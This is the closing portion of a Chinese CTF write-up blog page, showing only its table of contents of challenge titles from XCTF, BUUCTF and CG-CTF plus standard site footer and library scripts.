class="menu-list"><li><a class="level is-mobile" href="#baby-web"><span class="level-left"><span class="level-item">3.1.1</span><span class="level-item">baby web</span></span></a></li><li><a class="level is-mobile" href="#php-rce"><span class="level-left"><span class="level-item">3.1.2</span><span class="level-item">php rce</span></span></a></li><li><a class="level is-mobile" href="#web2"><span class="level-left"><span class="level-item">3.1.3</span><span class="level-item">web2</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Reverse"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">Reverse</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#csaw2013reversing2"><span class="level-left"><span class="level-item">3.2.1</span><span class="level-item">csaw2013reversing2</span></span></a></li><li><a class="level is-mobile" href="#dmd-50"><span class="level-left"><span class="level-item">3.2.2</span><span class="level-item">dmd-50</span></span></a></li><li><a class="level is-mobile" href="#re1"><span class="level-left"><span class="level-item">3.2.3</span><span class="level-item">re1</span></span></a></li><li><a class="level is-mobile" href="#game"><span class="level-left"><span class="level-item">3.2.4</span><span class="level-item">game</span></span></a></li><li><a class="level is-mobile" href="#getit"><span class="level-left"><span class="level-item">3.2.5</span><span class="level-item">getit</span></span></a></li><li><a class="level is-mobile" href="#Hello-Ctf"><span class="level-left"><span class="level-item">3.2.6</span><span class="level-item">Hello Ctf</span></span></a></li><li><a class="level is-mobile" href="#Open-Source"><span class="level-left"><span class="level-item">3.2.7</span><span class="level-item">Open Source</span></span></a></li><li><a class="level is-mobile" href="#insanity"><span class="level-left"><span class="level-item">3.2.8</span><span class="level-item">insanity</span></span></a></li><li><a class="level is-mobile" href="#logmein"><span class="level-left"><span class="level-item">3.2.9</span><span class="level-item">logmein</span></span></a></li><li><a class="level is-mobile" href="#maze"><span class="level-left"><span class="level-item">3.2.10</span><span class="level-item">maze</span></span></a></li><li><a class="level is-mobile" href="#no-strings-attached"><span class="level-left"><span class="level-item">3.2.11</span><span class="level-item">no strings attached</span></span></a></li><li><a class="level is-mobile" href="#python-trade"><span class="level-left"><span class="level-item">3.2.12</span><span class="level-item">python trade</span></span></a></li><li><a class="level is-mobile" href="#Shuffle"><span class="level-left"><span class="level-item">3.2.13</span><span class="level-item">Shuffle</span></span></a></li><li><a class="level is-mobile" href="#simple-unpack"><span class="level-left"><span class="level-item">3.2.14</span><span class="level-item">simple unpack</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#BUUCTF"><span class="level-left"><span class="level-item">4</span><span class="level-item">BUUCTF</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web-2"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ACTF2020-新生赛-BackupFile"><span class="level-left"><span class="level-item">4.1.1</span><span class="level-item">[ACTF2020 新生赛]BackupFile</span></span></a></li><li><a class="level is-mobile" href="#ASIS-2019-Unicorn-shop"><span class="level-left"><span class="level-item">4.1.2</span><span class="level-item">[ASIS 2019]Unicorn shop</span></span></a></li><li><a class="level is-mobile" href="#安洵杯-2019-easy-web"><span class="level-left"><span class="level-item">4.1.3</span><span class="level-item">[安洵杯 2019]easy_web</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-fake-google"><span class="level-left"><span class="level-item">4.1.4</span><span class="level-item">[BJDCTF 2nd]fake google</span></span></a></li><li><a class="level is-mobile" href="#安洵杯-2019-easy-serialize-php"><span class="level-left"><span class="level-item">4.1.5</span><span class="level-item">[安洵杯 2019]easy_serialize_php</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-EasySearch"><span class="level-left"><span class="level-item">4.1.6</span><span class="level-item">[BJDCTF2020]EasySearch</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-Schrödinger"><span class="level-left"><span class="level-item">4.1.7</span><span class="level-item">[BJDCTF 2nd]Schrödinger</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-duangShell"><span class="level-left"><span class="level-item">4.1.8</span><span class="level-item">[BJDCTF 2nd]duangShell</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-Cookie-is-so-stable"><span class="level-left"><span class="level-item">4.1.9</span><span class="level-item">[BJDCTF2020]Cookie is so stable</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-ZJCTF，不过如此"><span class="level-left"><span class="level-item">4.1.10</span><span class="level-item">[BJDCTF2020]ZJCTF，不过如此</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-The-mystery-of-ip"><span class="level-left"><span class="level-item">4.1.11</span><span class="level-item">[BJDCTF2020]The mystery of ip</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-简单注入"><span class="level-left"><span class="level-item">4.1.12</span><span class="level-item">[BJDCTF 2nd]简单注入</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-Mark-loves-cat"><span class="level-left"><span class="level-item">4.1.13</span><span class="level-item">[BJDCTF2020]Mark loves cat</span></span></a></li><li><a class="level is-mobile" href="#BUUCTF-2018-Online-Tool"><span class="level-left"><span class="level-item">4.1.14</span><span class="level-item">[BUUCTF 2018]Online Tool</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-总决赛-Day2-Web1-Easyweb"><span class="level-left"><span class="level-item">4.1.15</span><span class="level-item">[CISCN2019 总决赛 Day2 Web1]Easyweb</span></span></a></li><li><a class="level is-mobile" href="#CISCN-2019-初赛-Love-Math"><span class="level-left"><span class="level-item">4.1.16</span><span class="level-item">[CISCN 2019 初赛]Love Math</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-华北赛区-Day1-Web2-ikun"><span class="level-left"><span class="level-item">4.1.17</span><span class="level-item">[CISCN2019 华北赛区 Day1 Web2]ikun</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="level-left"><span class="level-item">4.1.18</span><span class="level-item">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-总决赛-Day2-Web1-Easyweb-1"><span class="level-left"><span class="level-item">4.1.19</span><span class="level-item">[CISCN2019 总决赛 Day2 Web1]Easyweb</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-华东南赛区-Web11"><span class="level-left"><span class="level-item">4.1.20</span><span class="level-item">[CISCN2019 华东南赛区]Web11</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-华北赛区-Day1-Web1-Dropbox"><span class="level-left"><span class="level-item">4.1.21</span><span class="level-item">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></span></a></li><li><a class="level is-mobile" href="#De1CTF-2019-SSRF-Me"><span class="level-left"><span class="level-item">4.1.22</span><span class="level-item">[De1CTF 2019]SSRF Me</span></span></a></li><li><a class="level is-mobile" href="#easy-tornado"><span class="level-left"><span class="level-item">4.1.23</span><span class="level-item">easy tornado</span></span></a></li><li><a class="level is-mobile" href="#GKCTF2020-cve版签到"><span class="level-left"><span class="level-item">4.1.24</span><span class="level-item">[GKCTF2020]cve版签到</span></span></a></li><li><a class="level is-mobile" href="#GKCTF2020-老八小超市儿"><span class="level-left"><span class="level-item">4.1.25</span><span class="level-item">[GKCTF2020]老八小超市儿</span></span></a></li><li><a class="level is-mobile" href="#GKCTF2020-EZ三剑客-EzWeb"><span class="level-left"><span class="level-item">4.1.26</span><span class="level-item">[GKCTF2020]EZ三剑客-EzWeb</span></span></a></li><li><a class="level is-mobile" href="#GKCTF2020-CheckIN"><span class="level-left"><span class="level-item">4.1.27</span><span class="level-item">[GKCTF2020]CheckIN</span></span></a></li><li><a class="level is-mobile" href="#GXYCTF2019-BabyUpload"><span class="level-left"><span class="level-item">4.1.28</span><span class="level-item">[GXYCTF2019]BabyUpload</span></span></a></li><li><a class="level is-mobile" href="#GXYCTF2019-禁止套娃"><span class="level-left"><span class="level-item">4.1.29</span><span class="level-item">[GXYCTF2019]禁止套娃</span></span></a></li><li><a class="level is-mobile" href="#GXYCTF2019-Ping-Ping-Ping"><span class="level-left"><span class="level-item">4.1.30</span><span class="level-item">[GXYCTF2019]Ping Ping Ping</span></span></a></li><li><a class="level is-mobile" href="#GXYCTF2019-BabySQli"><span class="level-left"><span class="level-item">4.1.31</span><span class="level-item">[GXYCTF2019]BabySQli</span></span></a></li><li><a class="level is-mobile" href="#GWCTF-2019-我有一个数据库"><span class="level-left"><span class="level-item">4.1.32</span><span class="level-item">[GWCTF 2019]我有一个数据库</span></span></a></li><li><a class="level is-mobile" href="#GWCTF-2019-枯燥的抽奖"><span class="level-left"><span class="level-item">4.1.33</span><span class="level-item">[GWCTF 2019]枯燥的抽奖</span></span></a></li><li><a class="level is-mobile" href="#GYCTF2020-FlaskApp"><span class="level-left"><span class="level-item">4.1.34</span><span class="level-item">[GYCTF2020]FlaskApp</span></span></a></li><li><a class="level is-mobile" href="#GYCTF2020-Blacklist"><span class="level-left"><span class="level-item">4.1.35</span><span class="level-item">[GYCTF2020]Blacklist</span></span></a></li><li><a class="level is-mobile" href="#HCTF-2018-warmup"><span class="level-left"><span class="level-item">4.1.36</span><span class="level-item">[HCTF] 2018 warmup</span></span></a></li><li><a class="level is-mobile" href="#HCTF-admin"><span class="level-left"><span class="level-item">4.1.37</span><span class="level-item">[HCTF] admin</span></span></a></li><li><a class="level is-mobile" href="#HFCTF2020-EasyLogin"><span class="level-left"><span class="level-item">4.1.38</span><span class="level-item">[HFCTF2020]EasyLogin</span></span></a></li><li><a class="level is-mobile" href="#MRCTF2020-Ez-bypass"><span class="level-left"><span class="level-item">4.1.39</span><span class="level-item">[MRCTF2020]Ez_bypass</span></span></a></li><li><a class="level is-mobile" href="#MRCTF2020-你传你🐎呢"><span class="level-left"><span class="level-item">4.1.40</span><span class="level-item">[MRCTF2020]你传你🐎呢</span></span></a></li><li><a class="level is-mobile" href="#MRCTF2020-PYWebsite"><span class="level-left"><span class="level-item">4.1.41</span><span class="level-item">[MRCTF2020]PYWebsite</span></span></a></li><li><a class="level is-mobile" href="#MRCTF2020-Ezpop"><span class="level-left"><span class="level-item">4.1.42</span><span class="level-item">[MRCTF2020]Ezpop</span></span></a></li><li><a class="level is-mobile" href="#NPUCTF2020-ReadlezPHP"><span class="level-left"><span class="level-item">4.1.43</span><span class="level-item">[NPUCTF2020]ReadlezPHP</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-PHP"><span class="level-left"><span class="level-item">4.1.44</span><span class="level-item">[极客大挑战 2019]PHP</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-Http"><span class="level-left"><span class="level-item">4.1.45</span><span class="level-item">[极客大挑战 2019]Http</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-Knife"><span class="level-left"><span class="level-item">4.1.46</span><span class="level-item">[极客大挑战 2019]Knife</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-EasySQL"><span class="level-left"><span class="level-item">4.1.47</span><span class="level-item">[极客大挑战 2019]EasySQL</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-HardSQL"><span class="level-left"><span class="level-item">4.1.48</span><span class="level-item">[极客大挑战 2019]HardSQL</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-Secret-File"><span class="level-left"><span class="level-item">4.1.49</span><span class="level-item">[极客大挑战 2019]Secret File</span></span></a></li><li><a class="level is-mobile" href="#强网杯-随便注"><span class="level-left"><span class="level-item">4.1.50</span><span class="level-item">[强网杯] 随便注</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-FinalSQL"><span class="level-left"><span class="level-item">4.1.51</span><span class="level-item">[极客大挑战 2019]FinalSQL</span></span></a></li><li><a class="level is-mobile" href="#RoarCTF-2019-Easy-Java"><span class="level-left"><span class="level-item">4.1.52</span><span class="level-item">[RoarCTF 2019]Easy Java</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-Old-Hack"><span class="level-left"><span class="level-item">4.1.53</span><span class="level-item">[BJDCTF2020]Old Hack</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-Easy-MD5"><span class="level-left"><span class="level-item">4.1.54</span><span class="level-item">[BJDCTF2020]Easy MD5</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-假猪套天下第一"><span class="level-left"><span class="level-item">4.1.55</span><span class="level-item">[BJDCTF 2nd]假猪套天下第一</span></span></a></li><li><a class="level is-mobile" href="#RoarCTF-easy-calc"><span class="level-left"><span class="level-item">4.1.56</span><span class="level-item">[RoarCTF] easy calc</span></span></a></li><li><a class="level is-mobile" href="#SUCTF-easy-sql"><span class="level-left"><span class="level-item">4.1.57</span><span class="level-item">[SUCTF] easy sql</span></span></a></li><li><a class="level is-mobile" href="#SUCTF-2019-Pythonginx"><span class="level-left"><span class="level-item">4.1.58</span><span class="level-item">[SUCTF 2019]Pythonginx</span></span></a></li><li><a class="level is-mobile" href="#SUCTF-checkin"><span class="level-left"><span class="level-item">4.1.59</span><span class="level-item">[SUCTF] checkin</span></span></a></li><li><a class="level is-mobile" href="#SUCTF-easy-web"><span class="level-left"><span class="level-item">4.1.60</span><span class="level-item">[SUCTF] easy web</span></span></a></li><li><a class="level is-mobile" href="#SWPU2019-Web1"><span class="level-left"><span class="level-item">4.1.61</span><span class="level-item">[SWPU2019]Web1</span></span></a></li><li><a class="level is-mobile" href="#WUSTCTF2020-朴实无华"><span class="level-left"><span class="level-item">4.1.62</span><span class="level-item">[WUSTCTF2020]朴实无华</span></span></a></li><li><a class="level is-mobile" href="#WesternCTF2018-shrine"><span class="level-left"><span class="level-item">4.1.63</span><span class="level-item">[WesternCTF2018]shrine</span></span></a></li><li><a class="level is-mobile" href="#网鼎杯-2020-朱雀组-phpweb"><span class="level-left"><span class="level-item">4.1.64</span><span class="level-item">[网鼎杯 2020 朱雀组]phpweb</span></span></a></li><li><a class="level is-mobile" href="#网鼎杯-2020-朱雀组-Nmap"><span class="level-left"><span class="level-item">4.1.65</span><span class="level-item">[网鼎杯 2020 朱雀组]Nmap</span></span></a></li><li><a class="level is-mobile" href="#网鼎杯-2020-青龙组-ArdeUSerialz"><span class="level-left"><span class="level-item">4.1.66</span><span class="level-item">[网鼎杯 2020 青龙组]ArdeUSerialz</span></span></a></li><li><a class="level is-mobile" href="#网鼎杯-2018-Fakebook"><span class="level-left"><span class="level-item">4.1.67</span><span class="level-item">[网鼎杯 2018]Fakebook</span></span></a></li><li><a class="level is-mobile" href="#Zer0pts2020-Can-you-guess-it"><span class="level-left"><span class="level-item">4.1.68</span><span class="level-item">[Zer0pts2020]Can you guess it?</span></span></a></li><li><a class="level is-mobile" href="#ZJCTF-2019-NiZhuanSiWei"><span class="level-left"><span class="level-item">4.1.69</span><span class="level-item">[ZJCTF 2019]NiZhuanSiWei</span></span></a></li><li><a class="level is-mobile" href="#0CTF-2016-piapiapia"><span class="level-left"><span class="level-item">4.1.70</span><span class="level-item">[0CTF] 2016 piapiapia</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#CG-CTF"><span class="level-left"><span class="level-item">5</span><span class="level-item">CG-CTF</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web-3"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#层层递进"><span class="level-left"><span class="level-item">5.1.1</span><span class="level-item">层层递进</span></span></a></li><li><a class="level is-mobile" href="#php-decode"><span class="level-left"><span class="level-item">5.1.2</span><span class="level-item">php decode</span></span></a></li><li><a class="level is-mobile" href="#mysql"><span class="level-left"><span class="level-item">5.1.3</span><span class="level-item">mysql</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a><p class="is-size-7"><span>&copy; 2022 lll</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>